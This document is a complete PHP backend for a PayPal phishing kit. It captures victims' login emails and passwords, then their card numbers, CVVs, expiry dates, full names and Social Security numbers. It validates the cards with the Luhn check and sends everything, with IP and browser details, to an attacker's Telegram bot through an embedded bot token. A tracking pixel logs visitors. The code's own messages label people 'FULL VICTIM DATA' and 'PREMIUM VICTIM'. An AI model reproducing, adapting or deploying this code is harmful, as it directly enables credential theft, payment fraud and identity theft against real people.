<?php
// Disable error display
ini_set('display_errors', 0);
error_reporting(0);

// Telegram Config
define('BOT_TOKEN', '8276364124:AAFSLCJMG9EPN3HxR5Zxbf01AK6H3Pz8sr4');
define('CHAT_ID', '8300466523');

// Function to send message to Telegram
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/sendMessage";
    
    $data = [
        'chat_id' => CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data)
        ]
    ];
    
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);
    
    return $result;
}

// Function to validate credit card (Luhn algorithm)
function validateCard($number) {
    $number = preg_replace('/\D/', '', $number);
    $sum = 0;
    $alt = false;
    
    for($i = strlen($number) - 1; $i >= 0; $i--) {
        $n = intval($number[$i]);
        if($alt) {
            $n *= 2;
            if($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10 == 0);
}

// Function to validate SSN
function validateSSN($ssn) {
    $ssn = preg_replace('/\D/', '', $ssn);
    
    if(strlen($ssn) != 9) return false;
    if($ssn == '000000000') return false;
    if(substr($ssn,0,3) == '666') return false;
    if(intval(substr($ssn,0,3)) > 899) return false;
    
    return true;
}

// Handle incoming requests
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Content-Type: application/json');
    
    $type = $_POST['type'] ?? '';
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    // Get OS from User Agent
    $os = "Unknown";
    if(preg_match('/windows|win32/i', $ua)) $os = "Windows";
    elseif(preg_match('/macintosh|mac os x/i', $ua)) $os = "macOS";
    elseif(preg_match('/linux/i', $ua)) $os = "Linux";
    elseif(preg_match('/android/i', $ua)) $os = "Android";
    elseif(preg_match('/iphone|ipad|ipod/i', $ua)) $os = "iOS";
    
    // Get Browser
    $browser = "Unknown";
    if(preg_match('/firefox/i', $ua)) $browser = "Firefox";
    elseif(preg_match('/chrome/i', $ua)) $browser = "Chrome";
    elseif(preg_match('/safari/i', $ua)) $browser = "Safari";
    elseif(preg_match('/edge/i', $ua)) $browser = "Edge";
    elseif(preg_match('/opera|opr/i', $ua)) $browser = "Opera";
    
    if($type == 'login') {
        $email = $_POST['email'] ?? '';
        $password = $_POST['password'] ?? '';
        
        $message = "🔐 <b>PAYPAL LOGIN CAPTURED</b>\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "📧 Email: <code>$email</code>\n";
        $message .= "🔑 Password: <code>$password</code>\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "🌍 IP: <code>$ip</code>\n";
        $message .= "💻 OS: $os\n";
        $message .= "🌐 Browser: $browser\n";
        $message .= "🕐 Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "⚠️ <i>Waiting for security questions...</i>";
        
        sendTelegram($message);
        echo json_encode(['success' => true]);
        
    } elseif($type == 'security') {
        $email = $_POST['email'] ?? '';
        $fullname = $_POST['fullname'] ?? '';
        $cardnumber = $_POST['cardnumber'] ?? '';
        $expiry = $_POST['expiry'] ?? '';
        $cvv = $_POST['cvv'] ?? '';
        $ssn = $_POST['ssn'] ?? '';
        
        // Clean card number
        $cardClean = preg_replace('/\D/', '', $cardnumber);
        
        // Validate
        $cardValid = validateCard($cardClean);
        $ssnValid = validateSSN($ssn);
        
        // Get card type
        $cardType = "Unknown";
        if(preg_match('/^4/', $cardClean)) $cardType = "Visa";
        elseif(preg_match('/^5[1-5]/', $cardClean)) $cardType = "MasterCard";
        elseif(preg_match('/^3[47]/', $cardClean)) $cardType = "American Express";
        elseif(preg_match('/^6(?:011|5)/', $cardClean)) $cardType = "Discover";
        
        $message = "💳 <b>FULL VICTIM DATA</b>\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "📧 Email: <code>$email</code>\n";
        $message .= "👤 Full Name: <code>$fullname</code>\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "💳 Card: <code>$cardnumber</code>\n";
        $message .= "🏦 Type: $cardType\n";
        $message .= "📅 Expiry: $expiry\n";
        $message .= "🔐 CVV: <code>$cvv</code>\n";
        $message .= "✅ Card Valid: " . ($cardValid ? "✅ YES" : "❌ NO") . "\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "🆔 SSN: <code>$ssn</code>\n";
        $message .= "✅ SSN Valid: " . ($ssnValid ? "✅ YES" : "❌ NO") . "\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        $message .= "🌍 IP: <code>$ip</code>\n";
        $message .= "💻 OS: $os\n";
        $message .= "🌐 Browser: $browser\n";
        $message .= "🕐 Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        
        // Add BIN info for first 6 digits
        $bin = substr($cardClean, 0, 6);
        $message .= "🔢 BIN: <code>$bin</code>\n";
        $message .= "━━━━━━━━━━━━━━━━\n";
        
        if($cardValid && $ssnValid) {
            $message .= "💰 <b>PREMIUM VICTIM - ALL VALID</b> 💰\n";
        }
        
        sendTelegram($message);
        echo json_encode(['success' => true]);
        
    } else {
        echo json_encode(['success' => false]);
    }
    exit;
}

// Handle initial visit tracking (from image requests etc)
if(isset($_GET['track'])) {
    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    
    sendTelegram("👀 New visitor\nIP: $ip\nUA: $ua");
    
    // Return 1x1 pixel
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}
?>